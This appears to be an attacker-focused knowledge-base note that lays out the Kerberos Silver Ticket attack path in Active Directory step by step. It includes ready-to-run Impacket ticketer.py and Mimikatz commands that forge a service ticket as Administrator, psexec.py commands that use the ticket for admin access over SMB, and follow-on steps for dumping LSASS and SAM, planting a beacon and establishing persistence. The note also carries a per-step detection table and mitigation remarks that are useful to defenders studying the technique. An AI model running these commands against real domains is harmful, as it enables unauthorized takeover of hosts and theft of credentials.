---
title: "Attack Path: Silver Ticket (forged TGS with a service/machine secret) → access a specific service on a host"
type: note
created: 2026-09-06
updated: 2026-09-06
tags: [attack-path, active-directory, silver-ticket, kerberos, lateral-movement]
---

# Attack Path: Silver Ticket (forged TGS) → Access a Specific Service on a Host

The **Silver Ticket** kill-chain: you hold a **service account's (or machine
account's) NT hash / AES key** and its **SPN** (e.g. `cifs/<host>`). You
**forge a TGS offline** — the DC is **never contacted** — and present it to the
target host to access that one service (SMB/CIFS, but also MSSQL, HTTP, etc.)
as **any user you choose** (typically Administrator). Unlike a Golden Ticket
(domain-wide), a Silver Ticket is **scoped to that service on that host** —
which is also why it's quieter: no DC-side 4768/4769 to correlate. See
[[golden-silver-tickets]] (source) for the Golden vs Silver comparison,
[[kerberos-authentication]] for the TGS the ticket forges, and
[[service-account]] for where the secret comes from.

## Chain

```
You (a service/machine account's NT hash/AES key + its SPN, e.g. cifs/fileserver)
  --forge a TGS offline (ticketer.py / kerberos::golden /target /service)--> Silver TGT->TGS as Administrator
  --present the forged TGS to the target host's service--> access cifs/fileserver as Administrator
  --psexec/wmiexec on fileserver--> local admin on that host
```

## Prerequisites / what signals this path exists

- A **service or machine account's secret** (NT hash or AES key) — most often
  a **machine account** (`HOST$`) or a **service account** running on the
  target. Sources: [[kerberoasting]] (service acct), an offline
  [[ntds-dit]]/[[sam-database]] dump, or a DC's NTDS for a machine account.
- The account's **SPN** and the **domain SID** — needed to build the forged
  TGS. (The SPN is what scopes the ticket; the SID is embedded in the PAC.)
- A **target host** running a service with that SPN you want to reach (e.g.
  `cifs/<host>` for SMB).

```bash
# Confirm the secret + SPN + SID you have
#  - service/machine NT hash or AES key
#  - its SPN (cifs/<host>, mssql/<host>, etc.)
#  - the domain SID (S-1-5-21-...)
```
**Verify:** all three in hand. A missing SPN or SID means the forged TGS won't
validate on the target.

## Step 1 — Forge the TGS offline

```bash
# Impacket ticketer.py — forge a CIFS (SMB) TGS for the target host, as Administrator
ticketer.py -nthash <svc_nthash> -domain-sid S-1-5-21-... -domain corp.local \
  -spn cifs/<host>.corp.local Administrator
# -> Administrator.ccache (a forged TGS, no DC involved)

# Mimikatz equivalent (needs the secret + SPN)
# kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... \
#   /target:<host>.corp.local /service:cifs /rc4:<svc_nthash> /ptt
```
**Verify:** a `.ccache`/`.kirbi` containing the forged TGS. See
[[golden-silver-tickets]] (source) for the exact flags.

### Failure modes & fallbacks
- **Wrong SPN/SID** — the target rejects the ticket (PAC validation). Double-
  check the SPN matches the service and the SID is the domain SID.
- **RC4 vs AES** — match the target service's enctype; if it's AES-only, use
  the account's AES key. See [[kerberos-encryption-types]].

## Step 2 — Present the forged TGS to the target

```bash
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@<host>   # -> SMB access as Administrator
# (or wmiexec.py / smbclient.py with -k -no-pass)
```
**Verify:** an SMB session to `<host>` as `corp.local\Administrator`. The host
validates the TGS against the service account's secret — which you have — so
it accepts. **No DC was asked.** See [[smb]] for the exec transport.

### Failure modes & fallbacks
- **The service rejects the TGS** — SPN/enctype mismatch, or the target
  enforces strict PAC validation. Confirm the SPN + key type.
- **SMB-only access** — you forged a `cifs` TGS; you get SMB, not WMI/RDP.
  Forge a different SPN's TGS (e.g. `wmi`, `mssql/<host>`) if you need that
  service instead.

## Step 3 — Act on the host

```bash
whoami /all    # -> corp.local\administrator on <host>
# local admin on <host>: read LSASS, dump SAM, establish persistence, pivot
```
**Verify:** local admin context on `<host>`. From here it's standard local
privesc / lateral — dump [[lsass]]/[[sam-database]], plant a beacon, or move
on.

### Failure modes & fallbacks
- **The host is a gMSA-backed service** — the key rotates, so a forged TGS
  with the old key goes stale quickly ([[gmsa]]). Re-dump the current key or
  use a different account.
- **You only have SMB** — enough for most; for DCOM/WinRM forge the matching
  SPN's TGS.

## Detection summary (per step)

| Step | What fires | Your tell |
|------|-----------|-----------|
| 1 (forge) | *(nothing — offline)* | the DC is never involved (that's the point) |
| 2 (present) | host **4624** for Administrator, **no matching DC-side 4768/4769** | a TGS with no TGT request at the DC |
| 3 (act) | 4624/local admin activity on `<host>` | admin on the target |

**The Silver Ticket tell is host-local, not domain-wide:** the DC never sees
the ticket, so domain-level "4769 without 4768" detection (the Golden Ticket
tell) doesn't fire. You detect it on the **host** — a logon as Administrator
to a service with no corresponding DC ticket request, and PAC validation
failures. See [[golden-silver-tickets]] (source).

## Cleanup notes
- **The forged TGS is the durable artifact** on the host (its 4624). The
  offline forgery itself leaves no trace.
- If the service account's secret is suspected, expect it to be rotated
  ([[gmsa]] is the structural fix).
- A gMSA-backed service rotates the key — your forged TGS goes stale on the
  next rotation.

## Related
- [[golden-silver-tickets]] — the Golden (domain-wide) vs Silver (service-scoped) comparison
- [[kerberos-authentication]] — the TGS the ticket forges
- [[service-account]], [[gmsa]] — where the secret comes from (and the gMSA mitigation)
- [[kerberos-encryption-types]] — the key/enctype the TGS is built with
- [[krbtgt]] — the Golden Ticket's secret (contrast: Silver uses a service secret)
- [[smb]] — the `cifs` exec transport for step 2
- [[ccache]] — the ticket wallet the forged TGS lives in
- [[ad-persistence]] — durable access once you're on the host
